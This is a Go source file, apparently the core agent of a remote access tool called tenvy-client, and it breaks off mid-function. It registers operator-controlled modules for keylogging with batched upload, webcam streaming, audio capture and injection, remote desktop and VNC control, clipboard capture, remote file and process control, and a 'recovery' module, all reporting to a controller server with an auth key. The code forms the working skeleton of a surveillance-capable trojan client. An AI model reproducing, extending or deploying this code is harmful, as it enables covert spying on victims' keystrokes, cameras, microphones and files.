package agent

import (
	"context"
	"errors"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	appvnc "github.com/rootbay/tenvy-client/internal/modules/control/appvnc"
	audioctrl "github.com/rootbay/tenvy-client/internal/modules/control/audio"
	keyloggerctrl "github.com/rootbay/tenvy-client/internal/modules/control/keylogger"
	remotedesktop "github.com/rootbay/tenvy-client/internal/modules/control/remotedesktop"
	webcamctrl "github.com/rootbay/tenvy-client/internal/modules/control/webcam"
	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
	filemanager "github.com/rootbay/tenvy-client/internal/modules/management/filemanager"
	taskmanager "github.com/rootbay/tenvy-client/internal/modules/management/taskmanager"
	tcpconnections "github.com/rootbay/tenvy-client/internal/modules/management/tcpconnections"
	clientchat "github.com/rootbay/tenvy-client/internal/modules/misc/clientchat"
	recovery "github.com/rootbay/tenvy-client/internal/modules/operations/recovery"
	systeminfo "github.com/rootbay/tenvy-client/internal/modules/systeminfo"
	"github.com/rootbay/tenvy-client/internal/plugins"
	"github.com/rootbay/tenvy-client/internal/protocol"
)

type Config struct {
	AgentID      string
	BaseURL      string
	AuthKey      string
	HTTPClient   *http.Client
	Logger       *log.Logger
	UserAgent    string
	Provider     systeminfo.AgentInfoProvider
	BuildVersion string
	AgentConfig  protocol.AgentConfig
	Plugins      *plugins.Manager
}

func envBool(name string) bool {
	value := strings.TrimSpace(os.Getenv(name))
	switch strings.ToLower(value) {
	case "1", "true", "yes", "on":
		return true
	default:
		return false
	}
}

func envDuration(name string) time.Duration {
	value := strings.TrimSpace(os.Getenv(name))
	if value == "" {
		return 0
	}
	d, err := time.ParseDuration(value)
	if err != nil {
		return 0
	}
	return d
}

func envList(name string) []string {
	raw := os.Getenv(name)
	if strings.TrimSpace(raw) == "" {
		return nil
	}

	parts := strings.FieldsFunc(raw, func(r rune) bool {
		switch r {
		case ',', ';', '\n', '\r', '\t', ' ':
			return true
		default:
			return false
		}
	})

	if len(parts) == 0 {
		return nil
	}

	values := make([]string, 0, len(parts))
	for _, part := range parts {
		trimmed := strings.TrimSpace(part)
		if trimmed != "" {
			values = append(values, trimmed)
		}
	}
	if len(values) == 0 {
		return nil
	}
	return values
}

type ModuleCapability struct {
	Name        string
	Description string
}

type ModuleMetadata struct {
	ID           string
	Title        string
	Description  string
	Commands     []string
	Capabilities []ModuleCapability
}

type Module interface {
	ID() string
	Init(context.Context, Config) error
	Handle(context.Context, protocol.Command) error
	UpdateConfig(Config) error
	Shutdown(context.Context) error
}

type moduleMetadataProvider interface {
	Metadata() ModuleMetadata
}

type CommandResultError struct {
	Result protocol.CommandResult
}

func (e *CommandResultError) Error() string {
	if e == nil {
		return ""
	}
	if message := strings.TrimSpace(e.Result.Error); message != "" {
		return message
	}
	if e.Result.Success {
		if output := strings.TrimSpace(e.Result.Output); output != "" {
			return output
		}
		return "command completed"
	}
	return "command failed"
}

func WrapCommandResult(result protocol.CommandResult) error {
	return &CommandResultError{Result: result}
}

type moduleEntry struct {
	module   Module
	metadata ModuleMetadata
	commands []string
}

type appVncInputHandler interface {
	HandleInputBurst(context.Context, protocol.AppVncInputBurst) error
}

type moduleManager struct {
	mu        sync.RWMutex
	modules   map[string]*moduleEntry
	lifecycle []*moduleEntry
	remote    *remoteDesktopModule
	appVnc    appVncInputHandler
}

func newDefaultModuleManager() *moduleManager {
	registry := newModuleManager()
	registry.register(&appVncModule{})
	registry.register(newRemoteDesktopModule(nil))
	registry.register(&audioModule{})
	registry.register(&keyloggerModule{})
	registry.register(&webcamModule{})
	registry.register(&clipboardModule{})
	registry.register(&fileManagerModule{})
	registry.register(&taskManagerModule{})
	registry.register(&tcpConnectionsModule{})
	registry.register(&clientChatModule{})
	registry.register(&recoveryModule{})
	registry.register(&systemInfoModule{})
	return registry
}

func newModuleManager() *moduleManager {
	return &moduleManager{
		modules:   make(map[string]*moduleEntry),
		lifecycle: make([]*moduleEntry, 0, 6),
	}
}

func (r *moduleManager) register(m Module) {
	provider, ok := any(m).(moduleMetadataProvider)
	if !ok {
		panic("agent module missing metadata provider")
	}
	metadata := provider.Metadata()
	moduleID := strings.TrimSpace(m.ID())
	if moduleID == "" {
		panic("agent module missing identifier")
	}
	if strings.TrimSpace(metadata.ID) == "" {
		panic("agent module missing metadata id")
	}
	if metadata.ID != moduleID {
		panic(fmt.Sprintf("module %s metadata id mismatch: %s", moduleID, metadata.ID))
	}
	commands := metadata.Commands
	if len(commands) == 0 {
		panic(fmt.Sprintf("agent module %s does not declare any commands", metadata.ID))
	}
	entry := &moduleEntry{
		module:   m,
		metadata: metadata,
		commands: append([]string(nil), commands...),
	}
	if remote, ok := m.(*remoteDesktopModule); ok {
		r.remote = remote
	}
	if app, ok := any(m).(appVncInputHandler); ok {
		r.appVnc = app
	}
	r.lifecycle = append(r.lifecycle, entry)
	for _, command := range entry.commands {
		if strings.TrimSpace(command) == "" {
			continue
		}
		if existing, ok := r.modules[command]; ok {
			panic(fmt.Sprintf("command %q already registered by module %s", command, existing.metadata.ID))
		}
		r.modules[command] = entry
	}
}

func (r *moduleManager) Init(ctx context.Context, cfg Config) error {
	r.mu.Lock()
	defer r.mu.Unlock()

	var errs []error
	for _, entry := range r.lifecycle {
		if err := entry.module.Init(ctx, cfg); err != nil {
			label := entry.metadata.Title
			if strings.TrimSpace(label) == "" {
				label = entry.metadata.ID
			}
			errs = append(errs, fmt.Errorf("%s: %w", label, err))
		}
	}

	return errors.Join(errs...)
}

func (r *moduleManager) UpdateConfig(cfg Config) error {
	r.mu.Lock()
	defer r.mu.Unlock()

	var errs []error
	for _, entry := range r.lifecycle {
		if err := entry.module.UpdateConfig(cfg); err != nil {
			label := entry.metadata.Title
			if strings.TrimSpace(label) == "" {
				label = entry.metadata.ID
			}
			errs = append(errs, fmt.Errorf("%s: %w", label, err))
		}
	}

	return errors.Join(errs...)
}

func (r *moduleManager) Metadata() []ModuleMetadata {
	r.mu.RLock()
	defer r.mu.RUnlock()

	metadata := make([]ModuleMetadata, 0, len(r.lifecycle))
	for _, entry := range r.lifecycle {
		metadata = append(metadata, entry.metadata)
	}
	return metadata
}

func (r *moduleManager) HandleCommand(ctx context.Context, cmd protocol.Command) (bool, protocol.CommandResult) {
	r.mu.RLock()
	entry, ok := r.modules[cmd.Name]
	r.mu.RUnlock()
	if !ok {
		return false, protocol.CommandResult{}
	}
	return true, r.wrapCommandResult(cmd, entry.module.Handle(ctx, cmd))
}

func (r *moduleManager) Shutdown(ctx context.Context) error {
	r.mu.RLock()
	entries := append([]*moduleEntry(nil), r.lifecycle...)
	r.mu.RUnlock()

	var errs []error
	for index := len(entries) - 1; index >= 0; index-- {
		if err := entries[index].module.Shutdown(ctx); err != nil {
			label := entries[index].metadata.Title
			if strings.TrimSpace(label) == "" {
				label = entries[index].metadata.ID
			}
			errs = append(errs, fmt.Errorf("%s: %w", label, err))
		}
	}

	return errors.Join(errs...)
}

func (r *moduleManager) wrapCommandResult(cmd protocol.Command, err error) protocol.CommandResult {
	completedAt := time.Now().UTC().Format(time.RFC3339Nano)
	if err == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     true,
			CompletedAt: completedAt,
		}
	}

	var resultErr *CommandResultError
	if errors.As(err, &resultErr) {
		result := resultErr.Result
		if strings.TrimSpace(result.CommandID) == "" {
			result.CommandID = cmd.ID
		}
		if strings.TrimSpace(result.CompletedAt) == "" {
			result.CompletedAt = completedAt
		}
		return result
	}

	return protocol.CommandResult{
		CommandID:   cmd.ID,
		Success:     false,
		Error:       err.Error(),
		CompletedAt: completedAt,
	}
}

func (r *moduleManager) remoteDesktopModule() *remoteDesktopModule {
	r.mu.RLock()
	defer r.mu.RUnlock()
	return r.remote
}

func (r *moduleManager) appVncModule() appVncInputHandler {
	r.mu.RLock()
	defer r.mu.RUnlock()
	return r.appVnc
}

type appVncModule struct {
	controller *appvnc.Controller
}

func (m *appVncModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "app-vnc",
		Title:       "Application VNC",
		Description: "Launches curated applications inside a disposable workspace and streams them through VNC.",
		Commands:    []string{"app-vnc"},
		Capabilities: []ModuleCapability{
			{
				Name:        "app-vnc.launch",
				Description: "Clone per-application profiles and start virtualized sessions.",
			},
		},
	}
}

func (m *appVncModule) ID() string {
	return "app-vnc"
}

func (m *appVncModule) ensureController() *appvnc.Controller {
	if m.controller == nil {
		m.controller = appvnc.NewController()
	}
	return m.controller
}

func (m *appVncModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *appVncModule) configure(cfg Config) error {
	controller := m.ensureController()
	root := filepath.Join(os.TempDir(), "tenvy-appvnc")
	if err := os.MkdirAll(root, 0o755); err != nil {
		return fmt.Errorf("prepare app-vnc workspace root: %w", err)
	}
	controller.Update(appvnc.Config{
		Logger:        cfg.Logger,
		WorkspaceRoot: root,
	})
	return nil
}

func (m *appVncModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *appVncModule) Handle(ctx context.Context, cmd protocol.Command) error {
	controller := m.ensureController()
	if controller == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "app-vnc controller unavailable",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(controller.HandleCommand(ctx, cmd))
}

func (m *appVncModule) HandleInputBurst(ctx context.Context, burst protocol.AppVncInputBurst) error {
	controller := m.ensureController()
	if controller == nil {
		return errors.New("app-vnc controller unavailable")
	}
	return controller.HandleInputBurst(ctx, burst)
}

func (m *appVncModule) Shutdown(ctx context.Context) error {
	if m.controller != nil {
		m.controller.Shutdown(ctx)
	}
	return nil
}

func (a *Agent) moduleRuntime() Config {
	return Config{
		AgentID:      a.id,
		BaseURL:      a.baseURL,
		AuthKey:      a.key,
		HTTPClient:   a.client,
		Logger:       a.logger,
		UserAgent:    a.userAgent(),
		Provider:     a,
		BuildVersion: a.buildVersion,
		AgentConfig:  a.config,
		Plugins:      a.plugins,
	}
}

type remoteDesktopEngineFactory func(context.Context, Config, remotedesktop.Config) (remotedesktop.Engine, string, error)

type remoteDesktopModule struct {
	mu              sync.Mutex
	engine          remotedesktop.Engine
	engineConfig    remotedesktop.Config
	factory         remoteDesktopEngineFactory
	requiredVersion string
}

func newRemoteDesktopModule(engine remotedesktop.Engine) *remoteDesktopModule {
	module := &remoteDesktopModule{factory: defaultRemoteDesktopEngineFactory}
	if engine != nil {
		module.engine = engine
	}
	return module
}

func (m *remoteDesktopModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "remote-desktop",
		Title:       "Remote Desktop",
		Description: "Interactive remote desktop streaming and control.",
		Commands:    []string{"remote-desktop"},
		Capabilities: []ModuleCapability{
			{
				Name:        "remote-desktop.stream",
				Description: "Stream high fidelity desktop frames to the controller UI.",
			},
			{
				Name:        "remote-desktop.input",
				Description: "Relay keyboard and pointer input events back to the host.",
			},
		},
	}
}

func (m *remoteDesktopModule) ID() string {
	return "remote-desktop"
}

func (m *remoteDesktopModule) Init(ctx context.Context, cfg Config) error {
	return m.configure(ctx, cfg)
}

func (m *remoteDesktopModule) UpdateConfig(cfg Config) error {
	return m.configure(context.Background(), cfg)
}

func (m *remoteDesktopModule) configure(ctx context.Context, runtime Config) error {
	var requestTimeout time.Duration
	if runtime.HTTPClient != nil {
		requestTimeout = runtime.HTTPClient.Timeout
	}
	cfg := remotedesktop.Config{
		AgentID:        runtime.AgentID,
		BaseURL:        runtime.BaseURL,
		AuthKey:        runtime.AuthKey,
		Client:         runtime.HTTPClient,
		Logger:         runtime.Logger,
		UserAgent:      runtime.UserAgent,
		RequestTimeout: requestTimeout,
	}
	cfg.QUICInput.URL = os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_URL")
	cfg.QUICInput.Token = os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_TOKEN")
	cfg.QUICInput.ALPN = os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_ALPN")
	cfg.QUICInput.Disabled = envBool("TENVY_REMOTE_DESKTOP_QUIC_DISABLED")
	if d := envDuration("TENVY_REMOTE_DESKTOP_QUIC_CONNECT_TIMEOUT"); d > 0 {
		cfg.QUICInput.ConnectTimeout = d
	}
	if d := envDuration("TENVY_REMOTE_DESKTOP_QUIC_RETRY_INTERVAL"); d > 0 {
		cfg.QUICInput.RetryInterval = d
	}
	if v := strings.TrimSpace(os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_INSECURE")); strings.EqualFold(v, "1") || strings.EqualFold(v, "true") || strings.EqualFold(v, "yes") || strings.EqualFold(v, "on") {
		if runtime.Logger != nil {
			runtime.Logger.Printf("remote desktop: TENVY_REMOTE_DESKTOP_QUIC_INSECURE is no longer supported; TLS validation remains enabled")
		}
	}
	if path := strings.TrimSpace(os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_ROOT_CA_FILE")); path != "" {
		cfg.QUICInput.RootCAFiles = append(cfg.QUICInput.RootCAFiles, path)
	}
	cfg.QUICInput.RootCAFiles = append(cfg.QUICInput.RootCAFiles, envList("TENVY_REMOTE_DESKTOP_QUIC_ROOT_CA_FILES")...)
	if pem := strings.TrimSpace(os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_ROOT_CA_PEM")); pem != "" {
		cfg.QUICInput.RootCAPEMs = append(cfg.QUICInput.RootCAPEMs, pem)
	}
	cfg.QUICInput.RootCAPEMs = append(cfg.QUICInput.RootCAPEMs, envList("TENVY_REMOTE_DESKTOP_QUIC_ROOT_CA_PEMS")...)
	cfg.QUICInput.PinnedSPKIHashes = append(cfg.QUICInput.PinnedSPKIHashes, envList("TENVY_REMOTE_DESKTOP_QUIC_SPKI_HASHES")...)
	cfg.QUICInput.PinnedSPKIHashes = append(cfg.QUICInput.PinnedSPKIHashes, envList("TENVY_REMOTE_DESKTOP_QUIC_PINNED_SPKI_HASHES")...)
	m.mu.Lock()
	factory := m.factory
	engine := m.engine
	version := strings.TrimSpace(m.requiredVersion)
	m.mu.Unlock()

	if version != "" {
		cfg.PluginVersion = version
	}

	if engine == nil {
		if factory == nil {
			factory = defaultRemoteDesktopEngineFactory
		}
		created, stagedVersion, err := factory(ctx, runtime, cfg)
		if err != nil {
			return err
		}
		stagedVersion = strings.TrimSpace(stagedVersion)
		if stagedVersion != "" {
			cfg.PluginVersion = stagedVersion
		}
		if err := created.Configure(cfg); err != nil {
			return err
		}
		m.mu.Lock()
		m.engine = created
		m.engineConfig = cfg
		if stagedVersion != "" {
			m.requiredVersion = stagedVersion
		}
		m.mu.Unlock()
		return nil
	}

	if err := engine.Configure(cfg); err != nil {
		return err
	}
	m.mu.Lock()
	m.engineConfig = cfg
	m.mu.Unlock()
	return nil
}

func (m *remoteDesktopModule) Handle(ctx context.Context, cmd protocol.Command) error {
	engine := m.currentEngine()
	if engine == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "remote desktop subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	payload, err := remotedesktop.DecodeCommandPayload(cmd.Payload)
	if err != nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       err.Error(),
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}

	var actionErr error
	switch strings.ToLower(strings.TrimSpace(payload.Action)) {
	case "start":
		actionErr = engine.StartSession(ctx, payload)
	case "stop":
		actionErr = engine.StopSession(payload.SessionID)
	case "configure":
		actionErr = engine.UpdateSession(payload)
	case "input":
		actionErr = engine.HandleInput(ctx, payload)
	default:
		actionErr = fmt.Errorf("unsupported remote desktop action: %s", payload.Action)
	}

	result := protocol.CommandResult{
		CommandID:   cmd.ID,
		CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
	}
	if actionErr != nil {
		result.Success = false
		result.Error = actionErr.Error()
	} else {
		result.Success = true
		result.Output = fmt.Sprintf("remote desktop %s action processed", payload.Action)
	}
	return WrapCommandResult(result)
}

func (m *remoteDesktopModule) HandleInputBurst(ctx context.Context, burst protocol.RemoteDesktopInputBurst) error {
	engine := m.currentEngine()
	if engine == nil {
		return errors.New("remote desktop subsystem not initialized")
	}
	if len(burst.Events) == 0 {
		return nil
	}

	events := make([]remotedesktop.RemoteDesktopInputEvent, 0, len(burst.Events))
	for _, evt := range burst.Events {
		event := remotedesktop.RemoteDesktopInputEvent{
			Type:       remotedesktop.RemoteDesktopInputType(evt.Type),
			CapturedAt: evt.CapturedAt,
			X:          evt.X,
			Y:          evt.Y,
			Normalized: evt.Normalized,
			Monitor:    evt.Monitor,
			Button:     remotedesktop.RemoteDesktopMouseButton(evt.Button),
			Pressed:    evt.Pressed,
			DeltaX:     evt.DeltaX,
			DeltaY:     evt.DeltaY,
			DeltaMode:  evt.DeltaMode,
			Key:        evt.Key,
			Code:       evt.Code,
			KeyCode:    evt.KeyCode,
			Repeat:     evt.Repeat,
			AltKey:     evt.AltKey,
			CtrlKey:    evt.CtrlKey,
			ShiftKey:   evt.ShiftKey,
			MetaKey:    evt.MetaKey,
		}
		events = append(events, event)
	}

	payload := remotedesktop.RemoteDesktopCommandPayload{
		Action:    "input",
		SessionID: burst.SessionID,
		Events:    events,
	}

	return engine.HandleInput(ctx, payload)
}

func (m *remoteDesktopModule) Shutdown(context.Context) error {
	engine := m.currentEngine()
	if engine != nil {
		engine.Shutdown()
	}
	return nil
}

func (m *remoteDesktopModule) currentEngine() remotedesktop.Engine {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.engine
}

func defaultRemoteDesktopEngineFactory(ctx context.Context, runtime Config, cfg remotedesktop.Config) (remotedesktop.Engine, string, error) {
	manager := runtime.Plugins
	client := runtime.HTTPClient
	baseURL := strings.TrimSpace(runtime.BaseURL)
	agentID := strings.TrimSpace(runtime.AgentID)

	fallback := func() (remotedesktop.Engine, string, error) {
		engine := remotedesktop.NewRemoteDesktopStreamer(cfg)
		return engine, "", nil
	}

	if manager == nil || client == nil || baseURL == "" || agentID == "" {
		return fallback()
	}

	stageCtx := ctx
	if stageCtx == nil {
		stageCtx = context.Background()
	}

	stageCtx, cancel := context.WithTimeout(stageCtx, 30*time.Second)
	defer cancel()

	result, err := plugins.StageRemoteDesktopEngine(stageCtx, manager, client, baseURL, agentID, runtime.AuthKey, runtime.UserAgent)
	if err != nil {
		if runtime.Logger != nil {
			runtime.Logger.Printf("remote desktop: engine staging failed: %v", err)
		}
		return fallback()
	}

	version := strings.TrimSpace(result.Manifest.Version)
	engine := remotedesktop.NewManagedRemoteDesktopEngine(result.EntryPath, version, manager, runtime.Logger)
	return engine, version, nil
}

type audioModule struct {
	bridge *audioctrl.AudioBridge
}

type keyloggerModule struct {
	manager *keyloggerctrl.Manager
}

type webcamModule struct {
	manager *webcamctrl.Manager
}

func (m *webcamModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "webcam-control",
		Title:       "Webcam Control",
		Description: "Enumerate and control remote webcam devices.",
		Commands:    []string{"webcam-control"},
		Capabilities: []ModuleCapability{
			{
				Name:        "webcam.enumerate",
				Description: "Enumerate connected webcam devices and capabilities.",
			},
			{
				Name:        "webcam.stream",
				Description: "Initiate webcam streaming sessions when supported.",
			},
		},
	}
}

func (m *webcamModule) ID() string {
	return "webcam-control"
}

func (m *webcamModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *webcamModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *webcamModule) configure(runtime Config) error {
	cfg := webcamctrl.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = webcamctrl.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *webcamModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "webcam subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *webcamModule) Shutdown(context.Context) error {
	return nil
}

func (m *audioModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "audio-control",
		Title:       "Audio Control",
		Description: "Capture and inject audio streams across the remote session.",
		Commands:    []string{"audio-control"},
		Capabilities: []ModuleCapability{
			{
				Name:        "audio.capture",
				Description: "Capture remote system audio for operator playback.",
			},
			{
				Name:        "audio.inject",
				Description: "Inject operator supplied audio into the remote session.",
			},
		},
	}
}

func (m *audioModule) ID() string {
	return "audio-control"
}

func (m *audioModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *audioModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *audioModule) configure(runtime Config) error {
	cfg := audioctrl.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.bridge == nil {
		m.bridge = audioctrl.NewAudioBridge(cfg)
		return nil
	}
	m.bridge.UpdateConfig(cfg)
	return nil
}

func (m *audioModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.bridge == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "audio subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(m.bridge.HandleCommand(ctx, cmd))
}

func (m *audioModule) Shutdown(context.Context) error {
	if m.bridge != nil {
		m.bridge.Shutdown()
	}
	return nil
}

func (m *keyloggerModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "keylogger",
		Title:       "Keylogger",
		Description: "Capture keystrokes and related telemetry from the remote host.",
		Commands:    []string{"keylogger.start", "keylogger.stop"},
		Capabilities: []ModuleCapability{
			{
				Name:        "keylogger.stream",
				Description: "Stream keystroke telemetry to the controller in near real time.",
			},
			{
				Name:        "keylogger.batch",
				Description: "Batch keystrokes offline and upload on a schedule.",
			},
		},
	}
}

func (m *keyloggerModule) ID() string {
	return "keylogger"
}

func (m *keyloggerModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *keyloggerModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *keyloggerModule) configure(runtime Config) error {
	cfg := keyloggerctrl.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = keyloggerctrl.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *keyloggerModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "keylogger subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *keyloggerModule) Shutdown(context.Context) error {
	if m.manager != nil {
		m.manager.Shutdown(context.Background())
	}
	return nil
}

type clipboardModule struct {
	manager *clipboard.Manager
}

func (m *clipboardModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "clipboard",
		Title:       "Clipboard Manager",
		Description: "Synchronize clipboard data between the operator and remote host.",
		Commands:    []string{"clipboard"},
		Capabilities: []ModuleCapability{
			{
				Name:        "clipboard.capture",
				Description: "Capture clipboard updates emitted by the remote workstation.",
			},
			{
				Name:        "clipboard.push",
				Description: "Push operator provided clipboard payloads to the remote host.",
			},
		},
	}
}

func (m *clipboardModule) ID() string {
	return "clipboard"
}

func (m *clipboardModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *clipboardModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *clipboardModule) configure(runtime Config) error {
	cfg := clipboard.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = clipboard.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *clipboardModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "clipboard subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *clipboardModule) Shutdown(context.Context) error {
	if m.manager != nil {
		m.manager.Shutdown()
	}
	return nil
}

type fileManagerModule struct {
	manager *filemanager.Manager
}

func (m *fileManagerModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "file-manager",
		Title:       "File Manager",
		Description: "Inspect and manage the remote file system.",
		Commands:    []string{"file-manager"},
		Capabilities: []ModuleCapability{
			{
				Name:        "file-manager.explore",
				Description: "Enumerate directories and retrieve file contents from the host.",
			},
			{
				Name:        "file-manager.modify",
				Description: "Create, update, move, and delete files and directories on demand.",
			},
		},
	}
}

func (m *fileManagerModule) ID() string {
	return "file-manager"
}

func (m *fileManagerModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *fileManagerModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *fileManagerModule) configure(runtime Config) error {
	cfg := filemanager.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = filemanager.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *fileManagerModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "file manager subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *fileManagerModule) Shutdown(context.Context) error {
	// no teardown required for file system operations today
	return nil
}

type taskManagerModule struct {
	manager *taskmanager.Manager
}

func (m *taskManagerModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "task-manager",
		Title:       "Task Manager",
		Description: "Enumerate and control processes on the remote host.",
		Commands:    []string{"task-manager"},
		Capabilities: []ModuleCapability{
			{
				Name:        "task-manager.list",
				Description: "Collect real-time process snapshots with metadata.",
			},
			{
				Name:        "task-manager.control",
				Description: "Start and orchestrate process actions on demand.",
			},
		},
	}
}

func (m *taskManagerModule) ID() string {
	return "task-manager"
}

func (m *taskManagerModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *taskManagerModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *taskManagerModule) configure(runtime Config) error {
	if m.manager == nil {
		m.manager = taskmanager.NewManager(runtime.Logger)
		return nil
	}
	m.manager.UpdateLogger(runtime.Logger)
	return nil
}

func (m *taskManagerModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "task manager subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
}

func (m *taskManagerModule) Shutdown(context.Context) error {
	// no persistent resources to release today
	return nil
}

type tcpConnectionsModule struct {
	manager *tcpconnections.Manager
}

func (m *tcpConnectionsModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "tcp-connections",
		Title:       "TCP Connections",
		Description: "Enumerate and govern active TCP sockets exposed by the host.",
		Commands:    []string{"tcp-connections"},
		Capabilities: []ModuleCapability{
			{
				Name:        "tcp-connections.enumerate",
				Description: "Collect real-time socket state with process attribution.",
			},
			{
				Name:        "tcp-connections.control",
				Description: "Stage enforcement actions for suspicious remote peers.",
			},
		},
	}
}

func (m *tcpConnectionsModule) ID() string {
	return "tcp-connections"
}

func (m *tcpConnectionsModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *tcpConnectionsModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *tcpConnectionsModule) configure(runtime Config) error {
	cfg := tcpconnections.Config{
		AgentID:   runtime.AgentID,
		BaseURL:   runtime.BaseURL,
		AuthKey:   runtime.AuthKey,
		Client:    runtime.HTTPClient,
		Logger:    runtime.Logger,
		UserAgent: runtime.UserAgent,
	}
	if m.manager == nil {
		m.manager = tcpconnections.NewManager(cfg)
		return nil
	}
	m.manager.UpdateConfig(cfg)
	return nil
}

func (m *tcpConnectionsModule) Handle(ctx context.Context, cmd protocol.Command) error {
	if m.manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "tcp connections subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
